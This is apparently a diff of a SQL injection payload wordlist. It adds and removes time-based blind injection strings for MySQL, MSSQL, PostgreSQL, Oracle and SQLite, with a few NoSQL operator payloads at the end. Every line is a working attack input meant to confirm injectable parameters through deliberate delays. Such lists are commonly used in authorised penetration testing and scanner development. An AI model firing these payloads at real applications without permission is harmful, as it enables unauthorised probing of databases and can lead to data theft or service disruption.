+') AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ('1337'='1337
+')) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (('1337'='1337
+'))) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ((('1337'='1337
+' AND (SELECT 3122 FROM (SELECT(SLEEP(5)))YYYY) AND '1337'='1337
+') AND (SELECT 4796 FROM (SELECT(SLEEP(5)))YYYY) AND ('1337'='1337
+')) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (('1337' LIKE '1337
+'))) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ((('1337' LIKE '1337
+%' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND '1337%'='1337
+' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND '1337' LIKE '1337
+\") AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (\"1337\"=\"1337
+\")) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ((\"1337\"=\"1337
+\"))) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (((\"1337\"=\"1337
+\" AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND \"1337\"=\"1337
+\") AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (\"1337\" LIKE \"1337
+\")) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ((\"1337\" LIKE \"1337
+\"))) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (((\"1337\" LIKE \"1337
+\" AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND \"1337\" LIKE \"1337
+' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) OR '1337'='1337
+') WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+\") WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+RLIKE SLEEP(5)--
+' RLIKE SLEEP(5)--
+' RLIKE SLEEP(5)-- 1337
+\" RLIKE SLEEP(5)-- 1337
+') RLIKE SLEEP(5)-- 1337
+') RLIKE SLEEP(5) AND ('1337'='1337
+')) RLIKE SLEEP(5) AND (('1337'='1337
+'))) RLIKE SLEEP(5) AND ((('1337'='1337
+) RLIKE SLEEP(5)-- 1337
+) RLIKE SLEEP(5) AND (1337=1337
+)) RLIKE SLEEP(5) AND ((1337=1337
+))) RLIKE SLEEP(5) AND (((1337=1337
+1 RLIKE SLEEP(5)
+1 RLIKE SLEEP(5)-- 1337
+1 RLIKE SLEEP(5)# 1337
+) WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+1 WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
++(SELECT 1337 WHERE 1337=1337 RLIKE SLEEP(5))+
+)) AS 1337 WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+) AS 1337 WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+` WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+`) WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+' RLIKE SLEEP(5) AND '1337'='1337
+') RLIKE SLEEP(5) AND ('1337' LIKE '1337
+')) RLIKE SLEEP(5) AND (('1337' LIKE '1337
+'))) RLIKE SLEEP(5) AND ((('1337' LIKE '1337
+%' RLIKE SLEEP(5) AND '1337%'='1337
+' RLIKE SLEEP(5) AND '1337' LIKE '1337
+\") RLIKE SLEEP(5) AND (\"1337\"=\"1337
+\")) RLIKE SLEEP(5) AND ((\"1337\"=\"1337
+\"))) RLIKE SLEEP(5) AND (((\"1337\"=\"1337
+\" RLIKE SLEEP(5) AND \"1337\"=\"1337
+\") RLIKE SLEEP(5) AND (\"1337\" LIKE \"1337
+\")) RLIKE SLEEP(5) AND ((\"1337\" LIKE \"1337
+\"))) RLIKE SLEEP(5) AND (((\"1337\" LIKE \"1337
+\" RLIKE SLEEP(5) AND \"1337\" LIKE \"1337
+' RLIKE SLEEP(5) OR '1337'='1337
+') WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+\") WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+' WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+\" WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+' AND ELT(1337=1337,SLEEP(5))--
+' AND ELT(1337=1337,SLEEP(5))-- 1337
+\" AND ELT(1337=1337,SLEEP(5))-- 1337
+') AND ELT(1337=1337,SLEEP(5))-- 1337
+') AND ELT(1337=1337,SLEEP(5)) AND ('1337'='1337
+')) AND ELT(1337=1337,SLEEP(5)) AND (('1337'='1337
+'))) AND ELT(1337=1337,SLEEP(5)) AND ((('1337'='1337
+' AND ELT(1337=1337,SLEEP(5)) AND '1337'='1337
+') AND ELT(1337=1337,SLEEP(5)) AND ('1337' LIKE '1337
+')) AND ELT(1337=1337,SLEEP(5)) AND (('1337' LIKE '1337
+'))) AND ELT(1337=1337,SLEEP(5)) AND ((('1337' LIKE '1337
+) AND ELT(1337=1337,SLEEP(5))-- 1337
+) AND ELT(1337=1337,SLEEP(5)) AND (1337=1337
+)) AND ELT(1337=1337,SLEEP(5)) AND ((1337=1337
+))) AND ELT(1337=1337,SLEEP(5)) AND (((1337=1337
+1 AND ELT(1337=1337,SLEEP(5))
+1 AND ELT(1337=1337,SLEEP(5))-- 1337
+1 AND ELT(1337=1337,SLEEP(5))# 1337
+) WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+1 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
++(SELECT 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))+
+)) AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+) AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+` WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+`) WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+1`=`1` AND ELT(1337=1337,SLEEP(5)) AND `1`=`1
+]-(SELECT 0 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))|[1
+%' AND ELT(1337=1337,SLEEP(5)) AND '1337%'='1337
+' AND ELT(1337=1337,SLEEP(5)) AND '1337' LIKE '1337
+\") AND ELT(1337=1337,SLEEP(5)) AND (\"1337\"=\"1337
+\")) AND ELT(1337=1337,SLEEP(5)) AND ((\"1337\"=\"1337
+\"))) AND ELT(1337=1337,SLEEP(5)) AND (((\"1337\"=\"1337
+\" AND ELT(1337=1337,SLEEP(5)) AND \"1337\"=\"1337
+\") AND ELT(1337=1337,SLEEP(5)) AND (\"1337\" LIKE \"1337
+\")) AND ELT(1337=1337,SLEEP(5)) AND ((\"1337\" LIKE \"1337
+\"))) AND ELT(1337=1337,SLEEP(5)) AND (((\"1337\" LIKE \"1337
+\" AND ELT(1337=1337,SLEEP(5)) AND \"1337\" LIKE \"1337
+' AND ELT(1337=1337,SLEEP(5)) OR '1337'='FMTE
+') WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+\") WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+' WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+\" WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+'||(SELECT 0x4c454f67 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))||'
+'||(SELECT 0x727a5277 FROM DUAL WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))||'
+'+(SELECT 0x4b6b486c WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))+'
+||(SELECT 0x57556971 FROM DUAL WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))||
+||(SELECT 0x67664847 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))||
++(SELECT 0x74764164 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))+
+')) AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+\")) AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+') AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+\") AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+' AND 1337=BENCHMARK(5000000,MD5(0x774c5341))--
+' AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 1337
+\" AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 1337
+') AND =BENCHMARK(5000000,MD5(0x774c5341))--
+') AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 1337
+') AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ('1337'='1337
+')) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (('1337'='1337
+'))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((('1337'='1337
+' AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND '1337'='1337
+') AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ('1337' LIKE '1337
+')) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (('1337' LIKE '1337
+'))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((('1337' LIKE '1337
+%' AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND '1337%'='1337
+' AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND '1337' LIKE '1337
+\") AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (\"1337\"=\"1337
+\")) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((\"1337\"=\"1337
+\"))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (((\"1337\"=\"1337
+\" AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND \"1337\"=\"1337
+\") AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (\"1337\" LIKE \"1337
+\")) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((\"1337\" LIKE \"1337
+\"))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (((\"1337\" LIKE \"1337
+\" AND 1337=BENCHMARK(5000000,MD5(0x576e7a57)) AND \"1337\" LIKE \"1337
+' AND 1337=BENCHMARK(5000000,MD5(0x576e7a57)) AND '1337'='1337
+##MSSQL##
 ;waitfor delay '0:0:5'--
+';WAITFOR DELAY '0:0:5'--
 );waitfor delay '0:0:5'--
 ';waitfor delay '0:0:5'--
 \";waitfor delay '0:0:5'--
@@ -299,16 +245,38 @@ sleep(5)#
 ));waitfor delay '0:0:5'--
 '));waitfor delay '0:0:5'--
 \"));waitfor delay '0:0:5'--
-benchmark(10000000,MD5(1))#
-1 or benchmark(10000000,MD5(1))#
-\" or benchmark(10000000,MD5(1))#
-' or benchmark(10000000,MD5(1))#
-1) or benchmark(10000000,MD5(1))#
-\") or benchmark(10000000,MD5(1))#
-') or benchmark(10000000,MD5(1))#
-1)) or benchmark(10000000,MD5(1))#
-\")) or benchmark(10000000,MD5(1))#
-')) or benchmark(10000000,MD5(1))#
+\") IF (1=1) WAITFOR DELAY '0:0:5'--
+';%5waitfor%5delay%5'0:0:5'%5--%5
+' WAITFOR DELAY '0:0:5'--
+' WAITFOR DELAY '0:0:5'
+or WAITFOR DELAY '0:0:5'--
+or WAITFOR DELAY '0:0:5'
+and WAITFOR DELAY '0:0:5'--
+and WAITFOR DELAY '0:0:5'
+WAITFOR DELAY '0:0:5'
+;WAITFOR DELAY '0:0:5'--
+;WAITFOR DELAY '0:0:5'
+1 WAITFOR DELAY '0:0:5'--
+1 WAITFOR DELAY '0:0:5'
+1 WAITFOR DELAY '0:0:5'-- 1337
+1' WAITFOR DELAY '0:0:5' AND '1337'='1337
+1') WAITFOR DELAY '0:0:5' AND ('1337'='1337
+1) WAITFOR DELAY '0:0:5' AND (1337=1337
+') WAITFOR DELAY '0:0:5'--
+\" WAITFOR DELAY '0:0:5'--
+')) WAITFOR DELAY '0:0:5'--
+'))) WAITFOR DELAY '0:0:5'--
+%' WAITFOR DELAY '0:0:5'--
+\") WAITFOR DELAY '0:0:5'--
+\")) WAITFOR DELAY '0:0:5'--
+\"))) WAITFOR DELAY '0:0:5'--
+##PostgresSQL##
+\";SELECT pg_sleep(5);
+;SELECT pg_sleep(5);
+and SELECT pg_sleep(5);
+1 SELECT pg_sleep(5);
+or SELECT pg_sleep(5);
+(SELECT pg_sleep(5))
 pg_sleep(5)--
 1 or pg_sleep(5)--
 \" or pg_sleep(5)--
@@ -319,59 +287,71 @@ pg_sleep(5)--
 1)) or pg_sleep(5)--
 \")) or pg_sleep(5)--
 ')) or pg_sleep(5)--
-AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
-AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
-AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
-AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
-AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
-SLEEP(5)#
-SLEEP(5)--
-SLEEP(5)=\"
-SLEEP(5)='
-or SLEEP(5)
-or SLEEP(5)#
-or SLEEP(5)--
-or SLEEP(5)=\"
-or SLEEP(5)='
-waitfor delay '00:00:05'
-waitfor delay '00:00:05'--
-waitfor delay '00:00:05'#
-benchmark(50000000,MD5(1))
-benchmark(50000000,MD5(1))--
-benchmark(50000000,MD5(1))#
-or benchmark(50000000,MD5(1))
-or benchmark(50000000,MD5(1))--
-or benchmark(50000000,MD5(1))#
 pg_SLEEP(5)
 pg_SLEEP(5)--
 pg_SLEEP(5)#
 or pg_SLEEP(5)
 or pg_SLEEP(5)--
 or pg_SLEEP(5)#
-'\\\"
-AnD SLEEP(5)
-AnD SLEEP(5)--
-AnD SLEEP(5)#
+' SELECT pg_sleep(5);
+or SELECT pg_sleep(5);
+' SELECT pg_sleep(5);
+1 AND 1337=(SELECT 1337 FROM PG_SLEEP(5))
+1 AND 1337=(SELECT 1337 FROM PG_SLEEP(5))-- 1337
+1' AND 1337=(SELECT 1337 FROM PG_SLEEP(5)) AND '1337'='1337
+1') AND 1337=(SELECT 1337 FROM PG_SLEEP(5)) AND ('1337'='1337
+1) AND 1337=(SELECT 1337 FROM PG_SLEEP(5)) AND (1337=1337
+##Oracle##
+1 AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5)
+1 AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5)-- 1337
+' AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5) AND '1337'='1337
+') AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5) AND ('1337'='1337
+) AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5) AND (1337=1337
+##Generic##
+sleep(5)#
+(sleep 5)--
+(sleep 5)
+(sleep(5))--
+(sleep(5))
+-sleep(5)
+SLEEP(5)#
+SLEEP(5)--
+SLEEP(5)=\"
+SLEEP(5)='
+\";sleep 5--
+\";sleep 5
+\";sleep(5)--
+\";sleep(5)
+\";SELECT SLEEP(5); #
+1 SELECT SLEEP(5); #
++ SLEEP(5) + '
 &&SLEEP(5)
 &&SLEEP(5)--
 &&SLEEP(5)#
-' AnD SLEEP(5) ANd '1
+;sleep 5--
+;sleep 5
+;sleep(5)--
+;sleep(5)
+;SELECT SLEEP(5); #
 '&&SLEEP(5)&&'1
+' SELECT SLEEP(5); #
+benchmark(50000000,MD5(1))
+benchmark(50000000,MD5(1))--
+benchmark(50000000,MD5(1))#
+or benchmark(50000000,MD5(1))
+or benchmark(50000000,MD5(1))--
+or benchmark(50000000,MD5(1))#
 ORDER BY SLEEP(5)
 ORDER BY SLEEP(5)--
 ORDER BY SLEEP(5)#
-(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
-(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
-(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
-+benchmark(3200,SHA1(1))+'
-+ SLEEP(10) + '
+AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+OR (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
 RANDOMBLOB(500000000\/2)
-AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000\/2))))
-OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000\/2))))
+AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000\/2))))
+OR 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000\/2))))
 RANDOMBLOB(1000000000\/2)
-AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000\/2))))
-OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000\/2))))
-SLEEP(1)\/*' or SLEEP(1) or '\" or SLEEP(1) or \"*\/
+AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000\/2))))
+OR 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000\/2))))
 '\"\\\/$[].>
 {\"$ne\": null}
 {\"$ne\": \"foo\"}
